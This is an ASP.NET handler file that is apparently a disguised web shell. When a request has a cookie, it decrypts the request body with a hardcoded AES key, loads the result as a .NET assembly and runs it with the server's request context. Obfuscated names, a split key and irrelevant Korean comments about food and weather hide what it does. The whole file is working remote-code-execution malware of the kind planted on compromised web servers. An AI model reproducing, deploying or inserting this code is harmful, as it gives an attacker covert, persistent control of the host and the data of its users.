<%@ WebHandler Language="C#" Class="hdl_z9y8" %>
using System.Web;using System.Text;using System.Reflection;using System.Security.Cryptography;

// 배고파요, 치킨 먹고 싶다.
public class hdl_z9y8 : IHttpHandler
{
    // 여기서 뭐하세요?
    public void ProcessRequest(HttpContext http_ctx_x7w6)
    {
        if (http_ctx_x7w6.Request.Cookies.Count != 0)
        {
            _m_v5u4_(http_ctx_x7w6);
        }
    }

    // 데이터 처리 시작.
    private void _m_v5u4_(HttpContext current_ctx)
    {
        byte[] payload_data = _m_t3s2_(current_ctx);
        byte[] key_bytes = _m_r1q0_();
        
        // 오늘 날씨가 정말 좋네요.
        byte[] decrypted_data = new RijndaelManaged().CreateDecryptor(key_bytes, key_bytes).TransformFinalBlock(payload_data, 0, payload_data.Length);
        
        _m_p9o8_(decrypted_data, current_ctx);
    }
    
    // 키를 가져옵니다.
    private byte[] _m_r1q0_()
    {
        string part1 = "ca634575";
        string part2 = "38b9b1e0";
        return Encoding.Default.GetBytes(part1 + part2);
    }

    // 요청 본문을 읽습니다.
    private byte[] _m_t3s2_(HttpContext ctx_param)
    {
        return ctx_param.Request.BinaryRead(ctx_param.Request.ContentLength);
    }

    // 최종 실행 단계.
    private void _m_p9o8_(byte[] asm_bytes, object trigger_obj)
    {
        // 점심 메뉴 추천 좀.
        string target_class = "K".Substring(0);
        Assembly.Load(asm_bytes).CreateInstance(target_class).Equals(trigger_obj);
    }

    // 재사용 안 함.
    public bool IsReusable { get { return false; } }
}